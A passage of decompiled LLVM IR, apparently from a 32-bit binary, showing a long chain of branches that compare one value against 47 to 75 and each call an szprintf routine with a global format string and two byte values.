  %v0_804a552 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804a552 = zext i8 %v0_804a552 to i32
  store i32 %v1_804a552, i32* @edx, align 4
  %v0_804a55e = load i8, i8* @global_var_805b559.40, align 1
  %v1_804a55e = zext i8 %v0_804a55e to i32
  %v2_804a56d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a56d, i32* @ebx, align 4
  %v5_804a574 = call i32 @szprintf(i32 %v2_804a56d, i32 ptrtoint ([13 x i8]* @global_var_8057cd5.86 to i32), i32 %v1_804a55e, i32 %v1_804a552)
  br label %dec_label_pc_804a57c

dec_label_pc_804a57c:                             ; preds = %dec_label_pc_804a54c, %dec_label_pc_804a552
  %v12_804a57c = icmp eq i32 %v11_8049ca7, 47
  %v1_804a580 = icmp eq i1 %v12_804a57c, false
  br i1 %v1_804a580, label %dec_label_pc_804a5ac, label %dec_label_pc_804a582

dec_label_pc_804a582:                             ; preds = %dec_label_pc_804a57c
  %v0_804a582 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804a582 = zext i8 %v0_804a582 to i32
  store i32 %v1_804a582, i32* @edx, align 4
  %v0_804a58e = load i8, i8* @global_var_805b559.40, align 1
  %v1_804a58e = zext i8 %v0_804a58e to i32
  %v2_804a59d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a59d, i32* @ebx, align 4
  %v5_804a5a4 = call i32 @szprintf(i32 %v2_804a59d, i32 ptrtoint ([13 x i8]* @global_var_8057ce2.87 to i32), i32 %v1_804a58e, i32 %v1_804a582)
  br label %dec_label_pc_804a5ac

dec_label_pc_804a5ac:                             ; preds = %dec_label_pc_804a57c, %dec_label_pc_804a582
  %v9_804a5ac = icmp eq i32 %v11_8049ca7, 48
  %v1_804a5b0 = icmp eq i1 %v9_804a5ac, false
  br i1 %v1_804a5b0, label %dec_label_pc_804a5dc, label %dec_label_pc_804a5b2

dec_label_pc_804a5b2:                             ; preds = %dec_label_pc_804a5ac
  %v0_804a5b2 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804a5b2 = zext i8 %v0_804a5b2 to i32
  store i32 %v1_804a5b2, i32* @edx, align 4
  %v0_804a5be = load i8, i8* @global_var_805b559.40, align 1
  %v1_804a5be = zext i8 %v0_804a5be to i32
  %v2_804a5cd = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a5cd, i32* @ebx, align 4
  %v5_804a5d4 = call i32 @szprintf(i32 %v2_804a5cd, i32 ptrtoint ([13 x i8]* @global_var_8057cef.88 to i32), i32 %v1_804a5be, i32 %v1_804a5b2)
  br label %dec_label_pc_804a5dc

dec_label_pc_804a5dc:                             ; preds = %dec_label_pc_804a5ac, %dec_label_pc_804a5b2
  %v12_804a5dc = icmp eq i32 %v11_8049ca7, 49
  %v1_804a5e0 = icmp eq i1 %v12_804a5dc, false
  br i1 %v1_804a5e0, label %dec_label_pc_804a60c, label %dec_label_pc_804a5e2

dec_label_pc_804a5e2:                             ; preds = %dec_label_pc_804a5dc
  %v0_804a5e2 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804a5e2 = zext i8 %v0_804a5e2 to i32
  store i32 %v1_804a5e2, i32* @edx, align 4
  %v0_804a5ee = load i8, i8* @global_var_805b559.40, align 1
  %v1_804a5ee = zext i8 %v0_804a5ee to i32
  %v2_804a5fd = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a5fd, i32* @ebx, align 4
  %v5_804a604 = call i32 @szprintf(i32 %v2_804a5fd, i32 ptrtoint ([13 x i8]* @global_var_8057cfc.89 to i32), i32 %v1_804a5ee, i32 %v1_804a5e2)
  br label %dec_label_pc_804a60c

dec_label_pc_804a60c:                             ; preds = %dec_label_pc_804a5dc, %dec_label_pc_804a5e2
  %v12_804a60c = icmp eq i32 %v11_8049ca7, 50
  %v1_804a610 = icmp eq i1 %v12_804a60c, false
  br i1 %v1_804a610, label %dec_label_pc_804a63c, label %dec_label_pc_804a612

dec_label_pc_804a612:                             ; preds = %dec_label_pc_804a60c
  %v0_804a612 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804a612 = zext i8 %v0_804a612 to i32
  store i32 %v1_804a612, i32* @edx, align 4
  %v0_804a61e = load i8, i8* @global_var_805b559.40, align 1
  %v1_804a61e = zext i8 %v0_804a61e to i32
  %v2_804a62d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a62d, i32* @ebx, align 4
  %v5_804a634 = call i32 @szprintf(i32 %v2_804a62d, i32 ptrtoint ([14 x i8]* @global_var_8057d09.90 to i32), i32 %v1_804a61e, i32 %v1_804a612)
  br label %dec_label_pc_804a63c

dec_label_pc_804a63c:                             ; preds = %dec_label_pc_804a60c, %dec_label_pc_804a612
  %v12_804a63c = icmp eq i32 %v11_8049ca7, 51
  %v1_804a640 = icmp eq i1 %v12_804a63c, false
  br i1 %v1_804a640, label %dec_label_pc_804a66c, label %dec_label_pc_804a642

dec_label_pc_804a642:                             ; preds = %dec_label_pc_804a63c
  %v0_804a642 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804a642 = zext i8 %v0_804a642 to i32
  store i32 %v1_804a642, i32* @edx, align 4
  %v0_804a64e = load i8, i8* @global_var_805b559.40, align 1
  %v1_804a64e = zext i8 %v0_804a64e to i32
  %v2_804a65d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a65d, i32* @ebx, align 4
  %v5_804a664 = call i32 @szprintf(i32 %v2_804a65d, i32 ptrtoint ([14 x i8]* @global_var_8057d17.91 to i32), i32 %v1_804a64e, i32 %v1_804a642)
  br label %dec_label_pc_804a66c

dec_label_pc_804a66c:                             ; preds = %dec_label_pc_804a63c, %dec_label_pc_804a642
  %v12_804a66c = icmp eq i32 %v11_8049ca7, 52
  %v1_804a670 = icmp eq i1 %v12_804a66c, false
  br i1 %v1_804a670, label %dec_label_pc_804a69c, label %dec_label_pc_804a672

dec_label_pc_804a672:                             ; preds = %dec_label_pc_804a66c
  %v0_804a672 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804a672 = zext i8 %v0_804a672 to i32
  store i32 %v1_804a672, i32* @edx, align 4
  %v0_804a67e = load i8, i8* @global_var_805b559.40, align 1
  %v1_804a67e = zext i8 %v0_804a67e to i32
  %v2_804a68d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a68d, i32* @ebx, align 4
  %v5_804a694 = call i32 @szprintf(i32 %v2_804a68d, i32 ptrtoint ([13 x i8]* @global_var_8057d25.92 to i32), i32 %v1_804a67e, i32 %v1_804a672)
  br label %dec_label_pc_804a69c

dec_label_pc_804a69c:                             ; preds = %dec_label_pc_804a66c, %dec_label_pc_804a672
  %v12_804a69c = icmp eq i32 %v11_8049ca7, 53
  %v1_804a6a0 = icmp eq i1 %v12_804a69c, false
  br i1 %v1_804a6a0, label %dec_label_pc_804a6cc, label %dec_label_pc_804a6a2

dec_label_pc_804a6a2:                             ; preds = %dec_label_pc_804a69c
  %v0_804a6a2 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804a6a2 = zext i8 %v0_804a6a2 to i32
  store i32 %v1_804a6a2, i32* @edx, align 4
  %v0_804a6ae = load i8, i8* @global_var_805b559.40, align 1
  %v1_804a6ae = zext i8 %v0_804a6ae to i32
  %v2_804a6bd = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a6bd, i32* @ebx, align 4
  %v5_804a6c4 = call i32 @szprintf(i32 %v2_804a6bd, i32 ptrtoint ([14 x i8]* @global_var_8057d32.93 to i32), i32 %v1_804a6ae, i32 %v1_804a6a2)
  br label %dec_label_pc_804a6cc

dec_label_pc_804a6cc:                             ; preds = %dec_label_pc_804a69c, %dec_label_pc_804a6a2
  %v12_804a6cc = icmp eq i32 %v11_8049ca7, 54
  %v1_804a6d0 = icmp eq i1 %v12_804a6cc, false
  br i1 %v1_804a6d0, label %dec_label_pc_804a6fc, label %dec_label_pc_804a6d2

dec_label_pc_804a6d2:                             ; preds = %dec_label_pc_804a6cc
  %v0_804a6d2 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804a6d2 = zext i8 %v0_804a6d2 to i32
  store i32 %v1_804a6d2, i32* @edx, align 4
  %v0_804a6de = load i8, i8* @global_var_805b559.40, align 1
  %v1_804a6de = zext i8 %v0_804a6de to i32
  %v2_804a6ed = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a6ed, i32* @ebx, align 4
  %v5_804a6f4 = call i32 @szprintf(i32 %v2_804a6ed, i32 ptrtoint ([15 x i8]* @global_var_8057d40.94 to i32), i32 %v1_804a6de, i32 %v1_804a6d2)
  br label %dec_label_pc_804a6fc

dec_label_pc_804a6fc:                             ; preds = %dec_label_pc_804a6cc, %dec_label_pc_804a6d2
  %v12_804a6fc = icmp eq i32 %v11_8049ca7, 55
  %v1_804a700 = icmp eq i1 %v12_804a6fc, false
  br i1 %v1_804a700, label %dec_label_pc_804a72c, label %dec_label_pc_804a702

dec_label_pc_804a702:                             ; preds = %dec_label_pc_804a6fc
  %v0_804a702 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804a702 = zext i8 %v0_804a702 to i32
  store i32 %v1_804a702, i32* @edx, align 4
  %v0_804a70e = load i8, i8* @global_var_805b559.40, align 1
  %v1_804a70e = zext i8 %v0_804a70e to i32
  %v2_804a71d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a71d, i32* @ebx, align 4
  %v5_804a724 = call i32 @szprintf(i32 %v2_804a71d, i32 ptrtoint ([14 x i8]* @global_var_8057d4f.95 to i32), i32 %v1_804a70e, i32 %v1_804a702)
  br label %dec_label_pc_804a72c

dec_label_pc_804a72c:                             ; preds = %dec_label_pc_804a6fc, %dec_label_pc_804a702
  %v12_804a72c = icmp eq i32 %v11_8049ca7, 56
  %v1_804a730 = icmp eq i1 %v12_804a72c, false
  br i1 %v1_804a730, label %dec_label_pc_804a75c, label %dec_label_pc_804a732

dec_label_pc_804a732:                             ; preds = %dec_label_pc_804a72c
  %v0_804a732 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804a732 = zext i8 %v0_804a732 to i32
  store i32 %v1_804a732, i32* @edx, align 4
  %v0_804a73e = load i8, i8* @global_var_805b559.40, align 1
  %v1_804a73e = zext i8 %v0_804a73e to i32
  %v2_804a74d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a74d, i32* @ebx, align 4
  %v5_804a754 = call i32 @szprintf(i32 %v2_804a74d, i32 ptrtoint ([14 x i8]* @global_var_8057d5d.96 to i32), i32 %v1_804a73e, i32 %v1_804a732)
  br label %dec_label_pc_804a75c

dec_label_pc_804a75c:                             ; preds = %dec_label_pc_804a72c, %dec_label_pc_804a732
  %v12_804a75c = icmp eq i32 %v11_8049ca7, 57
  %v1_804a760 = icmp eq i1 %v12_804a75c, false
  br i1 %v1_804a760, label %dec_label_pc_804a78c, label %dec_label_pc_804a762

dec_label_pc_804a762:                             ; preds = %dec_label_pc_804a75c
  %v0_804a762 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804a762 = zext i8 %v0_804a762 to i32
  store i32 %v1_804a762, i32* @edx, align 4
  %v0_804a76e = load i8, i8* @global_var_805b559.40, align 1
  %v1_804a76e = zext i8 %v0_804a76e to i32
  %v2_804a77d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a77d, i32* @ebx, align 4
  %v5_804a784 = call i32 @szprintf(i32 %v2_804a77d, i32 ptrtoint ([13 x i8]* @global_var_8057d6b.97 to i32), i32 %v1_804a76e, i32 %v1_804a762)
  br label %dec_label_pc_804a78c

dec_label_pc_804a78c:                             ; preds = %dec_label_pc_804a75c, %dec_label_pc_804a762
  %v12_804a78c = icmp eq i32 %v11_8049ca7, 58
  %v1_804a790 = icmp eq i1 %v12_804a78c, false
  br i1 %v1_804a790, label %dec_label_pc_804a7bc, label %dec_label_pc_804a792

dec_label_pc_804a792:                             ; preds = %dec_label_pc_804a78c
  %v0_804a792 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804a792 = zext i8 %v0_804a792 to i32
  store i32 %v1_804a792, i32* @edx, align 4
  %v0_804a79e = load i8, i8* @global_var_805b559.40, align 1
  %v1_804a79e = zext i8 %v0_804a79e to i32
  %v2_804a7ad = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a7ad, i32* @ebx, align 4
  %v5_804a7b4 = call i32 @szprintf(i32 %v2_804a7ad, i32 ptrtoint ([14 x i8]* @global_var_8057d78.98 to i32), i32 %v1_804a79e, i32 %v1_804a792)
  br label %dec_label_pc_804a7bc

dec_label_pc_804a7bc:                             ; preds = %dec_label_pc_804a78c, %dec_label_pc_804a792
  %v12_804a7bc = icmp eq i32 %v11_8049ca7, 59
  %v1_804a7c0 = icmp eq i1 %v12_804a7bc, false
  br i1 %v1_804a7c0, label %dec_label_pc_804a7ec, label %dec_label_pc_804a7c2

dec_label_pc_804a7c2:                             ; preds = %dec_label_pc_804a7bc
  %v0_804a7c2 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804a7c2 = zext i8 %v0_804a7c2 to i32
  store i32 %v1_804a7c2, i32* @edx, align 4
  %v0_804a7ce = load i8, i8* @global_var_805b559.40, align 1
  %v1_804a7ce = zext i8 %v0_804a7ce to i32
  %v2_804a7dd = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a7dd, i32* @ebx, align 4
  %v5_804a7e4 = call i32 @szprintf(i32 %v2_804a7dd, i32 ptrtoint ([14 x i8]* @global_var_8057d86.99 to i32), i32 %v1_804a7ce, i32 %v1_804a7c2)
  br label %dec_label_pc_804a7ec

dec_label_pc_804a7ec:                             ; preds = %dec_label_pc_804a7bc, %dec_label_pc_804a7c2
  %v12_804a7ec = icmp eq i32 %v11_8049ca7, 60
  %v1_804a7f0 = icmp eq i1 %v12_804a7ec, false
  br i1 %v1_804a7f0, label %dec_label_pc_804a81c, label %dec_label_pc_804a7f2

dec_label_pc_804a7f2:                             ; preds = %dec_label_pc_804a7ec
  %v0_804a7f2 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804a7f2 = zext i8 %v0_804a7f2 to i32
  store i32 %v1_804a7f2, i32* @edx, align 4
  %v0_804a7fe = load i8, i8* @global_var_805b559.40, align 1
  %v1_804a7fe = zext i8 %v0_804a7fe to i32
  %v2_804a80d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a80d, i32* @ebx, align 4
  %v5_804a814 = call i32 @szprintf(i32 %v2_804a80d, i32 ptrtoint ([14 x i8]* @global_var_8057d94.100 to i32), i32 %v1_804a7fe, i32 %v1_804a7f2)
  br label %dec_label_pc_804a81c

dec_label_pc_804a81c:                             ; preds = %dec_label_pc_804a7ec, %dec_label_pc_804a7f2
  %v12_804a81c = icmp eq i32 %v11_8049ca7, 61
  %v1_804a820 = icmp eq i1 %v12_804a81c, false
  br i1 %v1_804a820, label %dec_label_pc_804a84c, label %dec_label_pc_804a822

dec_label_pc_804a822:                             ; preds = %dec_label_pc_804a81c
  %v0_804a822 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804a822 = zext i8 %v0_804a822 to i32
  store i32 %v1_804a822, i32* @edx, align 4
  %v0_804a82e = load i8, i8* @global_var_805b559.40, align 1
  %v1_804a82e = zext i8 %v0_804a82e to i32
  %v2_804a83d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a83d, i32* @ebx, align 4
  %v5_804a844 = call i32 @szprintf(i32 %v2_804a83d, i32 ptrtoint ([14 x i8]* @global_var_8057da2.101 to i32), i32 %v1_804a82e, i32 %v1_804a822)
  br label %dec_label_pc_804a84c

dec_label_pc_804a84c:                             ; preds = %dec_label_pc_804a81c, %dec_label_pc_804a822
  %v12_804a84c = icmp eq i32 %v11_8049ca7, 62
  %v1_804a850 = icmp eq i1 %v12_804a84c, false
  br i1 %v1_804a850, label %dec_label_pc_804a87c, label %dec_label_pc_804a852

dec_label_pc_804a852:                             ; preds = %dec_label_pc_804a84c
  %v0_804a852 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804a852 = zext i8 %v0_804a852 to i32
  store i32 %v1_804a852, i32* @edx, align 4
  %v0_804a85e = load i8, i8* @global_var_805b559.40, align 1
  %v1_804a85e = zext i8 %v0_804a85e to i32
  %v2_804a86d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a86d, i32* @ebx, align 4
  %v5_804a874 = call i32 @szprintf(i32 %v2_804a86d, i32 ptrtoint ([14 x i8]* @global_var_8057db0.102 to i32), i32 %v1_804a85e, i32 %v1_804a852)
  br label %dec_label_pc_804a87c

dec_label_pc_804a87c:                             ; preds = %dec_label_pc_804a84c, %dec_label_pc_804a852
  %v12_804a87c = icmp eq i32 %v11_8049ca7, 63
  %v1_804a880 = icmp eq i1 %v12_804a87c, false
  br i1 %v1_804a880, label %dec_label_pc_804a8ac, label %dec_label_pc_804a882

dec_label_pc_804a882:                             ; preds = %dec_label_pc_804a87c
  %v0_804a882 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804a882 = zext i8 %v0_804a882 to i32
  store i32 %v1_804a882, i32* @edx, align 4
  %v0_804a88e = load i8, i8* @global_var_805b559.40, align 1
  %v1_804a88e = zext i8 %v0_804a88e to i32
  %v2_804a89d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a89d, i32* @ebx, align 4
  %v5_804a8a4 = call i32 @szprintf(i32 %v2_804a89d, i32 ptrtoint ([14 x i8]* @global_var_8057dbe.103 to i32), i32 %v1_804a88e, i32 %v1_804a882)
  br label %dec_label_pc_804a8ac

dec_label_pc_804a8ac:                             ; preds = %dec_label_pc_804a87c, %dec_label_pc_804a882
  %v9_804a8ac = icmp eq i32 %v11_8049ca7, 64
  %v1_804a8b0 = icmp eq i1 %v9_804a8ac, false
  br i1 %v1_804a8b0, label %dec_label_pc_804a8dc, label %dec_label_pc_804a8b2

dec_label_pc_804a8b2:                             ; preds = %dec_label_pc_804a8ac
  %v0_804a8b2 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804a8b2 = zext i8 %v0_804a8b2 to i32
  store i32 %v1_804a8b2, i32* @edx, align 4
  %v0_804a8be = load i8, i8* @global_var_805b559.40, align 1
  %v1_804a8be = zext i8 %v0_804a8be to i32
  %v2_804a8cd = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a8cd, i32* @ebx, align 4
  %v5_804a8d4 = call i32 @szprintf(i32 %v2_804a8cd, i32 ptrtoint ([14 x i8]* @global_var_8057dcc.104 to i32), i32 %v1_804a8be, i32 %v1_804a8b2)
  br label %dec_label_pc_804a8dc

dec_label_pc_804a8dc:                             ; preds = %dec_label_pc_804a8ac, %dec_label_pc_804a8b2
  %v12_804a8dc = icmp eq i32 %v11_8049ca7, 65
  %v1_804a8e0 = icmp eq i1 %v12_804a8dc, false
  br i1 %v1_804a8e0, label %dec_label_pc_804a90c, label %dec_label_pc_804a8e2

dec_label_pc_804a8e2:                             ; preds = %dec_label_pc_804a8dc
  %v0_804a8e2 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804a8e2 = zext i8 %v0_804a8e2 to i32
  store i32 %v1_804a8e2, i32* @edx, align 4
  %v0_804a8ee = load i8, i8* @global_var_805b559.40, align 1
  %v1_804a8ee = zext i8 %v0_804a8ee to i32
  %v2_804a8fd = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a8fd, i32* @ebx, align 4
  %v5_804a904 = call i32 @szprintf(i32 %v2_804a8fd, i32 ptrtoint ([14 x i8]* @global_var_8057dda.105 to i32), i32 %v1_804a8ee, i32 %v1_804a8e2)
  br label %dec_label_pc_804a90c

dec_label_pc_804a90c:                             ; preds = %dec_label_pc_804a8dc, %dec_label_pc_804a8e2
  %v12_804a90c = icmp eq i32 %v11_8049ca7, 66
  %v1_804a910 = icmp eq i1 %v12_804a90c, false
  br i1 %v1_804a910, label %dec_label_pc_804a93c, label %dec_label_pc_804a912

dec_label_pc_804a912:                             ; preds = %dec_label_pc_804a90c
  %v0_804a912 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804a912 = zext i8 %v0_804a912 to i32
  store i32 %v1_804a912, i32* @edx, align 4
  %v0_804a91e = load i8, i8* @global_var_805b559.40, align 1
  %v1_804a91e = zext i8 %v0_804a91e to i32
  %v2_804a92d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a92d, i32* @ebx, align 4
  %v5_804a934 = call i32 @szprintf(i32 %v2_804a92d, i32 ptrtoint ([14 x i8]* @global_var_8057de8.106 to i32), i32 %v1_804a91e, i32 %v1_804a912)
  br label %dec_label_pc_804a93c

dec_label_pc_804a93c:                             ; preds = %dec_label_pc_804a90c, %dec_label_pc_804a912
  %v12_804a93c = icmp eq i32 %v11_8049ca7, 67
  %v1_804a940 = icmp eq i1 %v12_804a93c, false
  br i1 %v1_804a940, label %dec_label_pc_804a96c, label %dec_label_pc_804a942

dec_label_pc_804a942:                             ; preds = %dec_label_pc_804a93c
  %v0_804a942 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804a942 = zext i8 %v0_804a942 to i32
  store i32 %v1_804a942, i32* @edx, align 4
  %v0_804a94e = load i8, i8* @global_var_805b559.40, align 1
  %v1_804a94e = zext i8 %v0_804a94e to i32
  %v2_804a95d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a95d, i32* @ebx, align 4
  %v5_804a964 = call i32 @szprintf(i32 %v2_804a95d, i32 ptrtoint ([14 x i8]* @global_var_8057df6.107 to i32), i32 %v1_804a94e, i32 %v1_804a942)
  br label %dec_label_pc_804a96c

dec_label_pc_804a96c:                             ; preds = %dec_label_pc_804a93c, %dec_label_pc_804a942
  %v12_804a96c = icmp eq i32 %v11_8049ca7, 68
  %v1_804a970 = icmp eq i1 %v12_804a96c, false
  br i1 %v1_804a970, label %dec_label_pc_804a99c, label %dec_label_pc_804a972

dec_label_pc_804a972:                             ; preds = %dec_label_pc_804a96c
  %v0_804a972 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804a972 = zext i8 %v0_804a972 to i32
  store i32 %v1_804a972, i32* @edx, align 4
  %v0_804a97e = load i8, i8* @global_var_805b559.40, align 1
  %v1_804a97e = zext i8 %v0_804a97e to i32
  %v2_804a98d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a98d, i32* @ebx, align 4
  %v5_804a994 = call i32 @szprintf(i32 %v2_804a98d, i32 ptrtoint ([14 x i8]* @global_var_8057e04.108 to i32), i32 %v1_804a97e, i32 %v1_804a972)
  br label %dec_label_pc_804a99c

dec_label_pc_804a99c:                             ; preds = %dec_label_pc_804a96c, %dec_label_pc_804a972
  %v12_804a99c = icmp eq i32 %v11_8049ca7, 69
  %v1_804a9a0 = icmp eq i1 %v12_804a99c, false
  br i1 %v1_804a9a0, label %dec_label_pc_804a9cc, label %dec_label_pc_804a9a2

dec_label_pc_804a9a2:                             ; preds = %dec_label_pc_804a99c
  %v0_804a9a2 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804a9a2 = zext i8 %v0_804a9a2 to i32
  store i32 %v1_804a9a2, i32* @edx, align 4
  %v0_804a9ae = load i8, i8* @global_var_805b559.40, align 1
  %v1_804a9ae = zext i8 %v0_804a9ae to i32
  %v2_804a9bd = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a9bd, i32* @ebx, align 4
  %v5_804a9c4 = call i32 @szprintf(i32 %v2_804a9bd, i32 ptrtoint ([14 x i8]* @global_var_8057e12.109 to i32), i32 %v1_804a9ae, i32 %v1_804a9a2)
  br label %dec_label_pc_804a9cc

dec_label_pc_804a9cc:                             ; preds = %dec_label_pc_804a99c, %dec_label_pc_804a9a2
  %v12_804a9cc = icmp eq i32 %v11_8049ca7, 70
  %v1_804a9d0 = icmp eq i1 %v12_804a9cc, false
  br i1 %v1_804a9d0, label %dec_label_pc_804a9fc, label %dec_label_pc_804a9d2

dec_label_pc_804a9d2:                             ; preds = %dec_label_pc_804a9cc
  %v0_804a9d2 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804a9d2 = zext i8 %v0_804a9d2 to i32
  store i32 %v1_804a9d2, i32* @edx, align 4
  %v0_804a9de = load i8, i8* @global_var_805b559.40, align 1
  %v1_804a9de = zext i8 %v0_804a9de to i32
  %v2_804a9ed = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a9ed, i32* @ebx, align 4
  %v5_804a9f4 = call i32 @szprintf(i32 %v2_804a9ed, i32 ptrtoint ([14 x i8]* @global_var_8057e20.110 to i32), i32 %v1_804a9de, i32 %v1_804a9d2)
  br label %dec_label_pc_804a9fc

dec_label_pc_804a9fc:                             ; preds = %dec_label_pc_804a9cc, %dec_label_pc_804a9d2
  %v12_804a9fc = icmp eq i32 %v11_8049ca7, 71
  %v1_804aa00 = icmp eq i1 %v12_804a9fc, false
  br i1 %v1_804aa00, label %dec_label_pc_804aa2c, label %dec_label_pc_804aa02

dec_label_pc_804aa02:                             ; preds = %dec_label_pc_804a9fc
  %v0_804aa02 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804aa02 = zext i8 %v0_804aa02 to i32
  store i32 %v1_804aa02, i32* @edx, align 4
  %v0_804aa0e = load i8, i8* @global_var_805b559.40, align 1
  %v1_804aa0e = zext i8 %v0_804aa0e to i32
  %v2_804aa1d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804aa1d, i32* @ebx, align 4
  %v5_804aa24 = call i32 @szprintf(i32 %v2_804aa1d, i32 ptrtoint ([14 x i8]* @global_var_8057e2e.111 to i32), i32 %v1_804aa0e, i32 %v1_804aa02)
  br label %dec_label_pc_804aa2c

dec_label_pc_804aa2c:                             ; preds = %dec_label_pc_804a9fc, %dec_label_pc_804aa02
  %v12_804aa2c = icmp eq i32 %v11_8049ca7, 72
  %v1_804aa30 = icmp eq i1 %v12_804aa2c, false
  br i1 %v1_804aa30, label %dec_label_pc_804aa5c, label %dec_label_pc_804aa32

dec_label_pc_804aa32:                             ; preds = %dec_label_pc_804aa2c
  %v0_804aa32 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804aa32 = zext i8 %v0_804aa32 to i32
  store i32 %v1_804aa32, i32* @edx, align 4
  %v0_804aa3e = load i8, i8* @global_var_805b559.40, align 1
  %v1_804aa3e = zext i8 %v0_804aa3e to i32
  %v2_804aa4d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804aa4d, i32* @ebx, align 4
  %v5_804aa54 = call i32 @szprintf(i32 %v2_804aa4d, i32 ptrtoint ([14 x i8]* @global_var_8057e3c.112 to i32), i32 %v1_804aa3e, i32 %v1_804aa32)
  br label %dec_label_pc_804aa5c

dec_label_pc_804aa5c:                             ; preds = %dec_label_pc_804aa2c, %dec_label_pc_804aa32
  %v12_804aa5c = icmp eq i32 %v11_8049ca7, 73
  %v1_804aa60 = icmp eq i1 %v12_804aa5c, false
  br i1 %v1_804aa60, label %dec_label_pc_804aa8c, label %dec_label_pc_804aa62

dec_label_pc_804aa62:                             ; preds = %dec_label_pc_804aa5c
  %v0_804aa62 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804aa62 = zext i8 %v0_804aa62 to i32
  store i32 %v1_804aa62, i32* @edx, align 4
  %v0_804aa6e = load i8, i8* @global_var_805b559.40, align 1
  %v1_804aa6e = zext i8 %v0_804aa6e to i32
  %v2_804aa7d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804aa7d, i32* @ebx, align 4
  %v5_804aa84 = call i32 @szprintf(i32 %v2_804aa7d, i32 ptrtoint ([14 x i8]* @global_var_8057e4a.113 to i32), i32 %v1_804aa6e, i32 %v1_804aa62)
  br label %dec_label_pc_804aa8c

dec_label_pc_804aa8c:                             ; preds = %dec_label_pc_804aa5c, %dec_label_pc_804aa62
  %v12_804aa8c = icmp eq i32 %v11_8049ca7, 74
  %v1_804aa90 = icmp eq i1 %v12_804aa8c, false
  br i1 %v1_804aa90, label %dec_label_pc_804aabc, label %dec_label_pc_804aa92

dec_label_pc_804aa92:                             ; preds = %dec_label_pc_804aa8c
  %v0_804aa92 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804aa92 = zext i8 %v0_804aa92 to i32
  store i32 %v1_804aa92, i32* @edx, align 4
  %v0_804aa9e = load i8, i8* @global_var_805b559.40, align 1
  %v1_804aa9e = zext i8 %v0_804aa9e to i32
  %v2_804aaad = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804aaad, i32* @ebx, align 4
  %v5_804aab4 = call i32 @szprintf(i32 %v2_804aaad, i32 ptrtoint ([14 x i8]* @global_var_8057e58.114 to i32), i32 %v1_804aa9e, i32 %v1_804aa92)
  br label %dec_label_pc_804aabc

dec_label_pc_804aabc:                             ; preds = %dec_label_pc_804aa8c, %dec_label_pc_804aa92
  %v12_804aabc = icmp eq i32 %v11_8049ca7, 75
  %v1_804aac0 = icmp eq i1 %v12_804aabc, false
  br i1 %v1_804aac0, label %dec_label_pc_804aaec, label %dec_label_pc_804aac2

dec_label_pc_804aac2:                             ; preds = %dec_label_pc_804aabc
  %v0_804aac2 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804aac2 = zext i8 %v0_804aac2 to i32
  store i32 %v1_804aac2, i32* @edx, align 4
  %v0_804aace = load i8, i8* @global_var_805b559.40, align 1
  %v1_804aace = zext i8 %v0_804aace to i32
  %v2_804aadd = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804aadd, i32* @ebx, align 4
  %v5_804aae4 = call i32 @szprintf(i32 %v2_804aadd, i32 ptrtoint ([14 x i8]* @global_var_8057e4a.113 to i32), i32 %v1_804aace, i32 %v1_804aac2)
  br label %dec_label_pc_804aaec

